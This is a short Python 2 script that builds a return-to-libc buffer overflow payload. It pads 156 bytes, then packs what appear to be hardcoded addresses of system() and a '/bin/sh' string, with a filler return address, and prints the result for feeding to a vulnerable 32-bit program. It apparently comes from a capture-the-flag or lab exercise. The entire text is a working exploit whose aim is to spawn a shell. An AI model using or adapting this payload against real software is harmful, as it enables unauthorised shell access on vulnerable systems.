import struct
name = "A" * 156
sys = struct.pack("I", 0xf7e6aed0)
trash = "AAAA"
binsh = struct.pack("I", 0xf7f897ec)

print name + sys + trash + binsh
